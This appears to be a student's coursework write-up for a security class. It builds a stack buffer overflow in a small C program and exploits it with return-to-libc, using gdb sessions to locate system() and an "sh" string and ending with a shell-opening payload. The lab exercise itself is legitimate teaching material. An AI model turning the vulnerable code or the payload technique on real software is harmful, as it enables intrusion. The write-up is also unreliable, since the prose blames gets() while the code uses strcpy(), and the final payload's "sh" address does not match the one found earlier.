
#Task 1
###Task 1.1 Vulnerable Program (5 points)
The initial task was to write a C/C++ program that contains a stack buffer overflow vulnerability. ```overflowable.c``` detailed below contains a vulnerability since it utilizes the vulnerable and depreceated ```gets()``` command.  This command does not check the size of the input against the size of what the buffer is.
######overflowable.c

```c
#include <stdio.h>
#include <strings.h>

int main(int argc, char *argv[]){
    char buffer[8];
    strcpy(buffer,argv[1]);
};
```
#####Compile Instructions
```sh
$ gcc overflowable.c -o overflowable -fno-stack-protector
```

####Task 1.2 Stack Layout (25 points)
Note: the stack layout should contain the following contents:
- Stack layout (5 points)
- High and low address of stack, stack grows direction (5 points)
- Size of each part on the stack (5 points)
- Content of each part of the stack (5 points)
- Overflowed area of the stack (5 points)

#####Prior to overflow:

![http://imgur.com/a/JoZV8](http://i.imgur.com/BxQlUpF.jpg)

#####After overflow: (to show overflowed area of the stack)

![http://imgur.com/a/JoZV8](http://i.imgur.com/h3S1iXe.jpg)

###Task 1.3 Exploiting Explanation (10 points)

To exploit the stack we must first figure out how to cause the program to crash.  It is easy to do this by inputing the following test procedures:

![crashing the program]()

After causing the program to crash, you must then try to find what the proper input to completely overide the return address.  I accomplished this by adding ```0``` onto the tail of my input.  The result from running the program should be something like ```Program received signal SIGSEGV, Segmentation fault. 0x30303030 in ?? ()```.  The reason that we are looking for ```0x30303030``` is the in ```ASCII``` the hex for ```0``` is ```30``` and we are looking for all 4.  The Steps below show how to accomplish this:

![crafting your input]()

To exploit we want the system to open a shell.  To do this we must develop shell code that will place the code we are trying to execute into the buffer we are overflowing and overwrite the return address so it points back into the buffer.  

To do this we must locate where the ```system``` call resides on our machine.

```
(gdb) b main
Breakpoint 1 at 0x8048420
(gdb) r
Starting program: /home/ubuntu/CS6035/project1/overflowable 

Breakpoint 1, 0x08048420 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7e56190 <__libc_system>
(gdb) 
```

When we issue the ```(gdb) print system``` command when the program is running we are given ```0xb7e56190``` as the location for the system command.  

To locate the location of a ```sh``` string to inject we search for ```sh``` in memory.  We dump the files that have symbols from out program and do a search across their memory by ```(gdb) find addr1,addr2,"sh"```

```
(gdb) info files
Symbols from "/home/ubuntu/CS6035/project1/overflowable".
Unix child process:
	Using the running image of child process 2771.
	While running this, GDB does not access memory from...
Local exec file:
	`/home/ubuntu/CS6035/project1/overflowable', file type elf32-i386.
	Entry point: 0x8048320
	0x08048154 - 0x08048167 is .interp
	0x08048168 - 0x08048188 is .note.ABI-tag
	0x08048188 - 0x080481ac is .note.gnu.build-id
	0x080481ac - 0x080481cc is .gnu.hash
	0x080481cc - 0x0804821c is .dynsym
	0x0804821c - 0x08048268 is .dynstr
	0x08048268 - 0x08048272 is .gnu.version
	0x08048274 - 0x08048294 is .gnu.version_r
	0x08048294 - 0x0804829c is .rel.dyn
	0x0804829c - 0x080482b4 is .rel.plt
	0x080482b4 - 0x080482d7 is .init
	0x080482e0 - 0x08048320 is .plt
	0x08048320 - 0x080484b2 is .text
	0x080484b4 - 0x080484c8 is .fini
	0x080484c8 - 0x080484d0 is .rodata
	0x080484d0 - 0x080484fc is .eh_frame_hdr
	0x080484fc - 0x080485ac is .eh_frame
	0x08049f08 - 0x08049f0c is .init_array
	0x08049f0c - 0x08049f10 is .fini_array
	0x08049f10 - 0x08049f14 is .jcr
	0x08049f14 - 0x08049ffc is .dynamic
	0x08049ffc - 0x0804a000 is .got
	0x0804a000 - 0x0804a018 is .got.plt
	0x0804a018 - 0x0804a020 is .data
	0x0804a020 - 0x0804a024 is .bss
	0xb7fde114 - 0xb7fde138 is .note.gnu.build-id in /lib/ld-linux.so.2
	0xb7fde138 - 0xb7fde1f8 is .hash in /lib/ld-linux.so.2
	0xb7fde1f8 - 0xb7fde2dc is .gnu.hash in /lib/ld-linux.so.2
	0xb7fde2dc - 0xb7fde4ac is .dynsym in /lib/ld-linux.so.2
	0xb7fde4ac - 0xb7fde642 is .dynstr in /lib/ld-linux.so.2
	0xb7fde642 - 0xb7fde67c is .gnu.version in /lib/ld-linux.so.2
	0xb7fde67c - 0xb7fde744 is .gnu.version_d in /lib/ld-linux.so.2
	0xb7fde744 - 0xb7fde7b4 is .rel.dyn in /lib/ld-linux.so.2
	0xb7fde7b4 - 0xb7fde7e4 is .rel.plt in /lib/ld-linux.so.2
	0xb7fde7f0 - 0xb7fde860 is .plt in /lib/ld-linux.so.2
	0xb7fde860 - 0xb7ff67ac is .text in /lib/ld-linux.so.2
	0xb7ff67c0 - 0xb7ffa7a0 is .rodata in /lib/ld-linux.so.2
	0xb7ffa7a0 - 0xb7ffae24 is .eh_frame_hdr in /lib/ld-linux.so.2
	0xb7ffae24 - 0xb7ffd71c is .eh_frame in /lib/ld-linux.so.2
	0xb7ffecc0 - 0xb7ffef34 is .data.rel.ro in /lib/ld-linux.so.2
	0xb7ffef34 - 0xb7ffefec is .dynamic in /lib/ld-linux.so.2
	0xb7ffefec - 0xb7ffeff8 is .got in /lib/ld-linux.so.2
	0xb7fff000 - 0xb7fff024 is .got.plt in /lib/ld-linux.so.2
	0xb7fff040 - 0xb7fff878 is .data in /lib/ld-linux.so.2
---Type <return> to continue, or q <return> to quit---
	0xb7fff878 - 0xb7fff938 is .bss in /lib/ld-linux.so.2
	0xb7e16174 - 0xb7e16198 is .note.gnu.build-id in /lib/i386-linux-gnu/libc.so.6
	0xb7e16198 - 0xb7e161b8 is .note.ABI-tag in /lib/i386-linux-gnu/libc.so.6
	0xb7e161b8 - 0xb7e19ec8 is .gnu.hash in /lib/i386-linux-gnu/libc.so.6
	0xb7e19ec8 - 0xb7e23438 is .dynsym in /lib/i386-linux-gnu/libc.so.6
	0xb7e23438 - 0xb7e2915e is .dynstr in /lib/i386-linux-gnu/libc.so.6
	0xb7e2915e - 0xb7e2a40c is .gnu.version in /lib/i386-linux-gnu/libc.so.6
	0xb7e2a40c - 0xb7e2a898 is .gnu.version_d in /lib/i386-linux-gnu/libc.so.6
	0xb7e2a898 - 0xb7e2a8d8 is .gnu.version_r in /lib/i386-linux-gnu/libc.so.6
	0xb7e2a8d8 - 0xb7e2d2e8 is .rel.dyn in /lib/i386-linux-gnu/libc.so.6
	0xb7e2d2e8 - 0xb7e2d348 is .rel.plt in /lib/i386-linux-gnu/libc.so.6
	0xb7e2d350 - 0xb7e2d420 is .plt in /lib/i386-linux-gnu/libc.so.6
	0xb7e2d420 - 0xb7f5eb6e is .text in /lib/i386-linux-gnu/libc.so.6
	0xb7f5eb70 - 0xb7f5fafb is __libc_freeres_fn in /lib/i386-linux-gnu/libc.so.6
	0xb7f5fb00 - 0xb7f5fcfe is __libc_thread_freeres_fn in /lib/i386-linux-gnu/libc.so.6
	0xb7f5fd00 - 0xb7f81754 is .rodata in /lib/i386-linux-gnu/libc.so.6
	0xb7f81754 - 0xb7f81767 is .interp in /lib/i386-linux-gnu/libc.so.6
	0xb7f81768 - 0xb7f88c0c is .eh_frame_hdr in /lib/i386-linux-gnu/libc.so.6
	0xb7f88c0c - 0xb7fb9f68 is .eh_frame in /lib/i386-linux-gnu/libc.so.6
	0xb7fb9f68 - 0xb7fba3c6 is .gcc_except_table in /lib/i386-linux-gnu/libc.so.6
	0xb7fba3c8 - 0xb7fbd928 is .hash in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1d4 - 0xb7fbe1dc is .tdata in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1dc - 0xb7fbe220 is .tbss in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1dc - 0xb7fbe1e8 is .init_array in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe1e8 - 0xb7fbe260 is __libc_subfreeres in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe260 - 0xb7fbe264 is __libc_atexit in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe264 - 0xb7fbe274 is __libc_thread_subfreeres in /lib/i386-linux-gnu/libc.so.6
	0xb7fbe280 - 0xb7fbfda8 is .data.rel.ro in /lib/i386-linux-gnu/libc.so.6
	0xb7fbfda8 - 0xb7fbfe98 is .dynamic in /lib/i386-linux-gnu/libc.so.6
	0xb7fbfe98 - 0xb7fbfff4 is .got in /lib/i386-linux-gnu/libc.so.6
	0xb7fc0000 - 0xb7fc003c is .got.plt in /lib/i386-linux-gnu/libc.so.6
	0xb7fc0040 - 0xb7fc0ebc is .data in /lib/i386-linux-gnu/libc.so.6
	0xb7fc0ec0 - 0xb7fc3a7c is .bss in /lib/i386-linux-gnu/libc.so.6
(gdb) Quit
(gdb) find 0x08048154,0xb7fc3a7c,'sh'
Invalid character constant.
(gdb) find 0x08048154,0xb7fc3a7c,"sh"
warning: Unable to access 16002 bytes of target memory at 0x8048154, halting search.
Pattern not found.
(gdb) find 0xb7fde114,0xb7fc3a7c,"sh"
Invalid search space, end precedes start.
(gdb) find 0xb7fde7f0,0xb7fc3a7c,"sh"
Invalid search space, end precedes start.
(gdb) find 0xb7fde114,0xb7fc3a7c,"sh"
Invalid search space, end precedes start.
(gdb) find 0x08048154,0xb7fc3a7c,"sh"
warning: Unable to access 16002 bytes of target memory at 0x8048154, halting search.
Pattern not found.
(gdb) find 0xb7fde7f0, 0xb7fff938, "sh"
0xb7ff7e5c <__PRETTY_FUNCTION__.9595+12>
0xb7ffde11
0xb7ffee11 <_rtld_global_ro+241>
3 patterns found.
```

3 patterns were found so we use the ```gdb x/e`` command to investigate those memory locations to see what is contained

```
(gdb) x/s 0xb7ffde11
0xb7ffde11:	"sh"
```

The ```sh``` has been found!

So our two important addresses are 

- ```sh``` at ```0xb7ffde11```
- ```system``` at ```0xb7e56190```

To craft the shellcode, add these commands in place of our ```0000``` that were on the original overflow string so it looks as follows:


```12345678123456781234``` + the shellcode for system() + ```\xb7\xe5\x61\x90``` + ```a dumb return address``` + the location for ```sh``` ```\xb7\xff\xde\x11```

But do to the way these are pushed onto the stack, we need to reverse them and it becomes:

```12345678123456781234``` + the shellcode for system() +```\x90\x61\xe5\xb7``` + ```a dumb return address``` + the location for ```sh``` ```\x11\xde\xff\xb7``` 


or in total ```12345678123456781234\x90\x61\xe5\xb7RETA\xf5\x40\xf7\xb7```

# Task 2:

###Task 2.1 Buffer overflow detection data craft and overflow proof in GDB (10 points)
###Task 2.2. Locate system() address in GDB (10 points)
###Task 2.3. Locate /bin/sh address in GDB(10 points)
###Task 2.4. Correct exploit payload in data.txt and being able to open the shell in terminal(30
points)

